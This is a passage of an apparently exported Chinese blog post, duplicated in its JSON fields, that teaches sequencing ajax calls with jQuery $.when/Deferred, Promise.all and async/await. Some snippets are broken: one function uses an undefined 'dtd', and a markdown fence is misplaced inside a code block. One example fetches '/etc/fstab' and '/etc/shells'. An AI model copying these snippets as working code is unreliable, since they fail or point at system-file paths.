data;</span><br><span class=\"line\">  <span class=\"comment\">// 匹配code</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( tempData ) &#123;</span><br><span class=\"line\">    cityName = tempData[ data.cityCode ];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>然后便解决了<code>燃眉之急</code>，好接下来，需求变了要求增加一个接口，接口2不仅要去匹配接口1，还要去匹配接口3，甚至更多接口，我们都要这样去写吗。好即使是您很有耐心，也很细心，但是作为程序员，有想过假如有人来维护你的代码，他的心情吗…此处省略一万字</p>\n<p>于是<code>jQuery</code>的<code>$.when</code>隆重登场<br>\n<code>$.when</code>方法接收不定个<code>deferred</code>类型的对象作为参数</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.when( </span><br><span class=\"line\">        $.ajax( <span class=\"string\">'/example1'</span> ),</span><br><span class=\"line\">        $.ajax( <span class=\"string\">'/example2'</span> ), </span><br><span class=\"line\">        $.ajax( <span class=\"string\">'/example3'</span> )</span><br><span class=\"line\">      ).then( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>从语法上你可以很清晰的看到注释的地方就是我们三个ajax返回后的回调函数，在这里你可以慢慢地做你基于这三个响应数据任何事，不必担心他们哪个因为响应时间过慢出现报错，你要问我怎么分别拿到三个回调的数据，那我只能说为什么不先尝试以下呢~</p>\n<p>好也许你不知道你此时到底要传递多少个ajax进去，3个、4个、5个都有可能，那你一定听说过’apply’方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> ajaxArray = [ $.ajax( <span class=\"string\">'/example1'</span> ) ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这里或许因为某个条件要添加一个ajax</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( condition ) &#123;</span><br><span class=\"line\">  ajaxArray.push( $.ajax( <span class=\"string\">'/example2'</span> ) );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 这里或许又因为某个条件要添加一个ajax</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( condition2 ) &#123;</span><br><span class=\"line\">  ajaxArray.push( $.ajax( <span class=\"string\">'/example3'</span> ) );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">``</span><span class=\"string\">`javascript</span></span><br><span class=\"line\"><span class=\"string\">$.when.apply( $, ajaxArray ).then( function( data ) &#123;</span></span><br><span class=\"line\"><span class=\"string\">  // do something</span></span><br><span class=\"line\"><span class=\"string\">&#125; );</span></span><br></pre></td></tr></table></figure>\n<p>代码是不是干净整洁又大方？比起一堆flag让人容易理解多了，写代码就是拼良心，嗯~</p>\n<p>也许你比较高端，还用了插件，你需要往这个插件里写入<code>ajax</code>返回的数据，但是插件加载需要很久，也许是内部有setTimeout，也许是js代码太多，但是良心开发商会为你提供ready事件供你使用。但是如果你是个强迫症： “为什么我就不能和插件同时去加载，等他ready我直接写入数据不就行了。”（嗯也许那个强迫症患者就是我）。<br>\n当你看到这里你肯定知道可以用<code>$.when</code>，去解决，但是等你写到一半，就会发现我特么怎么把插件和<code>when</code>方法对应起来，是的<code>when</code>方法的参数不是随随便便就能传的，它要的是<code>deferred</code>对象，别急jQuery肯定不会只给你造半个轮子供你使用的</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建一个延迟对象</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> deferred = $.Deferred();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deferredFn</span>(<span class=\"params\"> def </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 你的插件为你提供的ready回调</span></span><br><span class=\"line\">  plugin.ready( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 这里表明你的异步操作已经完成了不需要在等待了</span></span><br><span class=\"line\">    dtd.resolve( <span class=\"comment\">/* 如果有需要，这里可以传出你可能需要的数据，就像$.ajax里success方法给你的data一样 */</span> );    </span><br><span class=\"line\">  &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 返回一个promise对象，外部无法改变这个函数的状态</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> dtd.promise();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$.when( $.ajax( <span class=\"string\">'/example'</span> ), deferredFn( deferred<span class=\"comment\">/* 这里需要传入刚才创建的deferred对象 */</span> ) ).then( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\">  <span class=\"comment\">// 这个时候也许比你在ready回调里再去发起ajax请求效率高多了吧</span></span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//----------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 以上便解决非ajax对象与ajax对象结合的问题，但我觉得应该有简洁的写法对吧</span></span><br><span class=\"line\"></span><br><span class=\"line\">$.when( $.ajax( <span class=\"string\">'/example'</span> ), ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> dtd </span>) </span>&#123;</span><br><span class=\"line\">  plugin.ready( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    dtd.resolve();</span><br><span class=\"line\">  &#125; );</span><br><span class=\"line\">  <span class=\"keyword\">return</span> dtd.promise();</span><br><span class=\"line\">&#125;( $.Deferred() ) ) ).then( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\">  <span class=\"comment\">// 这个时候也许比你在ready回调里再去发起ajax请求效率高多了吧</span></span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>可能你还是对上面的<code>promise</code>,<code>deferred</code>等不是很了解，这里推荐阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html\" target=\"_blank\" rel=\"noopener\">jQuery的deferred对象详解</a></p>\n<hr>\n<p>也许你比较傲娇不用<code>jQuery</code>，那办法还是有的，原生的<code>Promise</code>对象</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> promise = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> resolve, reject </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// ... some code</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"comment\">/* 异步操作成功 */</span>) &#123;</span><br><span class=\"line\">    resolve( value );</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    reject( error );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">promise.then( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> value </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// success</span></span><br><span class=\"line\">&#125;, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> error </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// failure</span></span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>摆脱了框架的束缚，原生写起来也是很清爽的<br>\n上面的插件ready例子就可以这样改写了</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> promise = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> resolve, reject </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// ... some code</span></span><br><span class=\"line\"></span><br><span class=\"line\">  plugin.ready( resolve );</span><br><span class=\"line\">  <span class=\"comment\">// 没有error代码的话就不用管reject</span></span><br><span class=\"line\">&#125; );</span><br><span class=\"line\">promise.then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// ... some code</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>是否会觉的有点高大上呢<br>\n忘了说<code>$.when</code>的替代，那就是<code>Promise.all</code>方法了</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> p = <span class=\"built_in\">Promise</span>.all([p1, p2, p3]);</span><br></pre></td></tr></table></figure>\n<p>这里的参数类型和<code>$.when</code>稍有不同，这里传入的是一个数组对象，那我们就不必担心不定个异步参数的问题了，若想详细了解<code>Promise</code>可移步<a href=\"http://es6.ruanyifeng.com/#docs/promise\" target=\"_blank\" rel=\"noopener\">Promise 对象</a>，嗯是的，还是阮大神的</p>\n<hr>\n<p>看到这里的同学也是挺有耐心的，最上面的回调地狱我还没有忘，一层一层的嵌套真的很烦奥，就不能让代码堵在那？像<code>alert()</code>方法一样？答案当然是：能！<br>\n于是我们的<code>async</code>函数和<code>await</code>关键字登场了（是的，又是ES6，写代码还不用ES6和咸鱼有啥区别）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> asyncRequest = <span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> f1 = <span class=\"keyword\">await</span> $.ajax( <span class=\"string\">'/etc/fstab'</span> );</span><br><span class=\"line\">  <span class=\"keyword\">var</span> f2 = <span class=\"keyword\">await</span> $.ajax( <span class=\"string\">'/etc/shells'</span> );</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>wtf!这么简单？是的，就是这么简单，这个函数内部，就是按照你想要的、预期的、你所看到的顺序在执行，从上到下。</p>\n<p>但是这里要注意的是<code>await</code>关键字后面必须跟一个<code>Promise</code>对象，ajax返回的也行，因为js引擎在执行时还是会根据该对象的<code>then</code>方法的状态来决定下一步如何继续，并且，如果这个对象状态变更为<code>reject</code>状态或是抛出了异常，那后面的代码是不再执行的，就和普通的代码执行逻辑一样。<br>\n<code>async</code>函数还有许多用法和技巧，如果想详细了解依然可以移步阮一峰老师的<a href=\"http://es6.ruanyifeng.com/#docs/async\" target=\"_blank\" rel=\"noopener\">async 函数</a></p>\n<p>文章今天提到了<code>apply</code>函数，和其同路的还有<code>call</code>和<code>bind</code>，也许你又会说“好生僻”，可是，这都是经常用到的“神器”啊~，下一篇博文我将围绕这三个函数来讲讲他们的区别和实际使用</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前端的蓬勃发展和要求越来越高的用户体验，使得现在的web页面越来越依赖<code>ajax</code>，无处不在的ajax，无处不在的回调，使得你的代码越写越丑，还容易陷入<code>回调地狱</code>，比如这样：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.get(<span class=\"string\">'/test'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">  $.get(<span class=\"string\">'/test2'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">    $.get(<span class=\"string\">'/test3'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">      <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">      $.get(<span class=\"string\">'/test4'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">        <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $.get(<span class=\"string\">'/test5'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">          </span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>今天我们的主题是谈谈多个ajax（当然不仅仅是ajax，包括所有的异步操作）的情况，如何能保证预期的执行顺序。</p>\n<blockquote>\n<p>案例：<code>ajax2</code> 返回的结果需要去匹配<code>ajax1</code>中返回的结果</p>\n</blockquote>\n<p>ajax1返回了如下数据：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">'10001'</span>: <span class=\"string\">'成都'</span>,</span><br><span class=\"line\">  <span class=\"string\">'10002'</span>: <span class=\"string\">'德阳'</span>,</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ajax2返回了如下数据：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  cityCode: <span class=\"string\">'10001'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可能一般开发者会这样写：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> tempData = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"comment\">// 获取第一个接口的数据</span></span><br><span class=\"line\">$.get( <span class=\"string\">'/example1'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  tempData = data</span><br><span class=\"line\">&#125; )</span><br><span class=\"line\"><span class=\"comment\">// 获取第二个接口的数据</span></span><br><span class=\"line\">$.get( <span class=\"string\">'/example2'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 匹配code</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> cityName = tempData[ data.cityCode ];</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log( cityName )</span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>然后你发现好像对了，就这么完成了？多测试几次你就会发现，怎么有时候报错，有时候又正确呢？<br>\n那是因为这两个请求都是独立的，互不影响，若接口2响应速度比接口1快，那铁定是要报错的，因为这个时候<code>tempData</code>还未被接口1赋值，仍然是初始化的<code>null</code>，如果你发现了问题，并且有点开发经验那你可能就会这样解决：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> tempData = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> tempData2 = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> cityName = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"comment\">// 获取第一个接口的数据</span></span><br><span class=\"line\">$.get( <span class=\"string\">'/example1'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  tempData = data;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( cityName === <span class=\"literal\">null</span> &amp;&amp; tempData2 ) &#123;</span><br><span class=\"line\">    cityName = data[ tempData2.cityCode ];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; )</span><br><span class=\"line\"><span class=\"comment\">// 获取第二个接口的数据</span></span><br><span class=\"line\">$.get( <span class=\"string\">'/example2'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  tempData2 = data;</span><br><span class=\"line\">  <span class=\"comment\">// 匹配code</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( tempData ) &#123;</span><br><span class=\"line\">    cityName = tempData[ data.cityCode ];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>然后便解决了<code>燃眉之急</code>，好接下来，需求变了要求增加一个接口，接口2不仅要去匹配接口1，还要去匹配接口3，甚至更多接口，我们都要这样去写吗。好即使是您很有耐心，也很细心，但是作为程序员，有想过假如有人来维护你的代码，他的心情吗…此处省略一万字</p>\n<p>于是<code>jQuery</code>的<code>$.when</code>隆重登场<br>\n<code>$.when</code>方法接收不定个<code>deferred</code>类型的对象作为参数</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.when( </span><br><span class=\"line\">        $.ajax( <span class=\"string\">'/example1'</span> ),</span><br><span class=\"line\">        $.ajax( <span class=\"string\">'/example2'</span> ), </span><br><span class=\"line\">        $.ajax( <span class=\"string\">'/example3'</span> )</span><br><span class=\"line\">      ).then( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>从语法上你可以很清晰的看到注释的地方就是我们三个ajax返回后的回调函数，在这里你可以慢慢地做你基于这三个响应数据任何事，不必担心他们哪个因为响应时间过慢出现报错，你要问我怎么分别拿到三个回调的数据，那我只能说为什么不先尝试以下呢~</p>\n<p>好也许你不知道你此时到底要传递多少个ajax进去，3个、4个、5个都有可能，那你一定听说过’apply’方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> ajaxArray = [ $.ajax( <span class=\"string\">'/example1'</span> ) ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这里或许因为某个条件要添加一个ajax</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( condition ) &#123;</span><br><span class=\"line\">  ajaxArray.push( $.ajax( <span class=\"string\">'/example2'</span> ) );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 这里或许又因为某个条件要添加一个ajax</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( condition2 ) &#123;</span><br><span class=\"line\">  ajaxArray.push( $.ajax( <span class=\"string\">'/example3'</span> ) );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">``</span><span class=\"string\">`javascript</span></span><br><span class=\"line\"><span class=\"string\">$.when.apply( $, ajaxArray ).then( function( data ) &#123;</span></span><br><span class=\"line\"><span class=\"string\">  // do something</span></span><br><span class=\"line\"><span class=\"string\">&#125; );</span></span><br></pre></td></tr></table></figure>\n<p>代码是不是干净整洁又大方？比起一堆flag让人容易理解多了，写代码就是拼良心，嗯~</p>\n<p>也许你比较高端，还用了插件，你需要往这个插件里写入<code>ajax</code>返回的数据，但是插件加载需要很久，也许是内部有setTimeout，也许是js代码太多，但是良心开发商会为你提供ready事件供你使用。但是如果你是个强迫症： “为什么我就不能和插件同时去加载，等他ready我直接写入数据不就行了。”（嗯也许那个强迫症患者就是我）。<br>\n当你看到这里你肯定知道可以用<code>$.when</code>，去解决，但是等你写到一半，就会发现我特么怎么把插件和<code>when</code>方法对应起来，是的<code>when</code>方法的参数不是随随便便就能传的，它要的是<code>deferred</code>对象，别急jQuery肯定不会只给你造半个轮子供你使用的</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建一个延迟对象</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> deferred = $.Deferred();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deferredFn</span>(<span class=\"params\"> def </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 你的插件为你提供的ready回调</span></span><br><span class=\"line\">  plugin.ready( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 这里表明你的异步操作已经完成了不需要在等待了</span></span><br><span class=\"line\">    dtd.resolve( <span class=\"comment\">/* 如果有需要，这里可以传出你可能需要的数据，就像$.ajax里success方法给你的data一样 */</span> );    </span><br><span class=\"line\">  &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 返回一个promise对象，外部无法改变这个函数的状态</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> dtd.promise();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$.when( $.ajax( <span class=\"string\">'/example'</span> ), deferredFn( deferred<span class=\"comment\">/* 这里需要传入刚才创建的deferred对象 */</span> ) ).then( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\">  <span class=\"comment\">// 这个时候也许比你在ready回调里再去发起ajax请求效率高多了吧</span></span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//----------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 以上便解决非ajax对象与ajax对象结合的问题，但我觉得应该有简洁的写法对吧</span></span><br><span class=\"line\"></span><br><span class=\"line\">$.when( $.ajax( <span class=\"string\">'/example'</span> ), ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> dtd </span>) </span>&#123;</span><br><span class=\"line\">  plugin.ready( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    dtd.resolve();</span><br><span class=\"line\">  &#125; );</span><br><span class=\"line\">  <span class=\"keyword\">return</span> dtd.promise();</span><br><span class=\"line\">&#125;( $.Deferred() ) ) ).then( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\">  <span class=\"comment\">// 这个时候也许比你在ready回调里再去发起ajax请求效率高多了吧</span></span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>可能你还是对上面的<code>promise</code>,<code>deferred</code>等不是很了解，这里推荐阮一峰老师的<a 